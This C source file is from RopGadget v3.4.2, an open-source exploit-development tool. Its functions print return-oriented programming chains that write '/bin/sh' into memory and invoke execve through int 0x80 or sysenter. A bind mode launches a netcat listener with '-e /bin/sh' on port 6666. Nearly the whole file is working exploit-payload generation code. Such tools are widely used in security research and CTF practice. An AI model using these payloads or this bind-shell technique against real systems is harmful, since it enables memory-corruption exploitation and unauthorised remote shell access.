/*
** RopGadget - Release v3.4.2
** Jonathan Salwan - http://twitter.com/JonathanSalwan
** Allan Wirth - http://allanwirth.com/
** http://shell-storm.org
** 2012-11-11
**
** This program is free software; you can redistribute it and/or modify
** it under the terms of the GNU General Public License as published by
** the Free Software Foundation; either version 2 of the License, or
** (at your option) any later version.
**
** This program is distributed in the hope that it will be useful,
** but WITHOUT ANY WARRANTY; without even the implied warranty of
** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
** GNU General Public License for more details.
**
** You should have received a copy of the GNU General Public License
** along with this program; if not, write to the Free Software
** Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/

#include "ropgadget.h"

/* partie 1 | import shellcode in ROP instruction */
void x86_makecode_importsc(t_gadget *gadgets, size_t word_size) {
  t_importsc_writer wr;

  wr.mov_gad4 = &gadgets[0];
  wr.pop_gad  = &gadgets[1];
  wr.mov_gad2 = &gadgets[2];
  wr.mov_gad3 = &gadgets[3];

  fprintf(stdout, "\t%sPayload%s\n", YELLOW, ENDC);
  sc_print_gotwrite(&wr, word_size);
  fprintf(stdout, "\t%sEOF Payload%s\n", YELLOW, ENDC);
}

static void x86_makepartie2(t_gadget *, int, int, size_t);

/* local: partie 1 | write /bin/sh in .data for execve("/bin/sh", NULL, NULL)*/
/* remote: partie 1 bis | write //usr/bin/netcat -ltp6666 -e///bin//sh in .data */
void x86_makecode(t_gadget *gadgets, size_t word_size) {
  int argv_start;
  int envp_start;
  t_rop_writer wr;
  char *second_reg;
  char reg_stack[32] = "pop %"; /* Whatever register we use to point to .data */
  char **argv;
  size_t i;

  wr.mov = &gadgets[0];
  wr.pop_data = &gadgets[1];

  second_reg = get_reg(wr.mov->gadget->instruction, 0);
  strncat(reg_stack, second_reg, 3);
  free(second_reg);

  for (i = 1; i <= 4; i++)
    if (!strcmp(reg_stack, gadgets[i].inst)) {
      wr.pop_target = &gadgets[i];
      break;
    }

  wr.zero_data = &gadgets[5];
  if (word_size == 8 && wr.zero_data->gadget == NULL)
    wr.zero_data = &gadgets[6];

  argv = get_argv();

  fprintf(stdout, "\t%sPayload%s\n", YELLOW, ENDC);
  if (!bind_mode.flag)
    fprintf(stdout, "\t\t%s# execve /bin/sh generated by RopGadget v3.4.2%s\n", BLUE, ENDC);
  else
    fprintf(stdout, "\t\t%s# execve /bin/sh bindport %d generated by RopGadget v3.4.2%s\n", BLUE, bind_mode.port, ENDC);

  sc_print_argv((const char * const *)argv, &wr, 0, TRUE, word_size, &argv_start, &envp_start);

  free_argv(argv);

  x86_makepartie2(gadgets, argv_start, envp_start, word_size);

  fprintf(stdout, "\t%sEOF Payload%s\n", YELLOW, ENDC);
}

/* local: partie 2 init reg => %ebx = "/bin/sh\0" | %ecx = "\0" | %edx = "\0"  for execve("/bin/sh", NULL, NULL)*/
/* remote: partie 2 bis init reg => %ebx = "/usb/bin/netcat\0" | %ecx = arg | %edx = "\0" */
static void x86_makepartie2(t_gadget *gadgets, int argv_start, int envp_start, size_t word_size) {
  int i;
  t_gadget *pop_eax = &gadgets[1];
  t_gadget *pop_ebx = &gadgets[2];
  t_gadget *pop_ecx = &gadgets[3];
  t_gadget *pop_edx = &gadgets[4];
  t_gadget *int_80;
  t_gadget *sysenter;
  t_gadget *pop_ebp;
  t_gadget *xor_eax;
  t_gadget *inc_eax = NULL;

  xor_eax = &gadgets[5];
  if (word_size==8 && xor_eax->gadget == NULL)
    xor_eax = &gadgets[6];

  for (i = (word_size==4?6:7); i < (word_size==4?9:10) && (inc_eax == NULL || inc_eax->gadget == NULL); i++)
    inc_eax = &gadgets[i];

  if (word_size == 4) {
    int_80 = &gadgets[9];
    sysenter = &gadgets[10];
    pop_ebp = &gadgets[11];
  } else {
    sysenter = &gadgets[11];
  }


  /* set %ebx (program name) (%rdi on 64 bit) */
  sc_print_sect_addr_pop(pop_ebx, 0, TRUE, word_size);

  /* set %ecx (arguments) (%rsi on 64 bit)*/
  sc_print_sect_addr_pop(pop_ecx, argv_start, TRUE, word_size);

  /* set %edx (environment) (%rdx on 64 bit) */
  sc_print_sect_addr_pop(pop_edx, envp_start, TRUE, word_size);

  if (xor_eax->gadget != NULL && inc_eax->gadget != NULL) {
    /* set %eax => 0 */
    sc_print_solo_inst(xor_eax, word_size);

    /* set %eax => 0xb for sys_execve() (0x3b on 64 bit)*/
    for (i = 0; i != (word_size==4?0xb:0x3b); i++)
      sc_print_solo_inst(inc_eax, word_size);
  } else { /* Fallback eax/rax setting (Will add NULL BYTES) */
    sc_print_addr_pop(pop_eax, (word_size==4?0xb:0x3b), " execve", word_size);
  }

  if (word_size == 4) {
    if (int_80->gadget)
      sc_print_solo_inst(int_80, word_size);
    else if (sysenter->gadget && pop_ebp->gadget) {
      sc_print_sect_addr_pop(pop_ebp, 0, TRUE, word_size);
      sc_print_solo_inst(sysenter, word_size);
    }
  } else {
    sc_print_solo_inst(sysenter, word_size);
  }
}
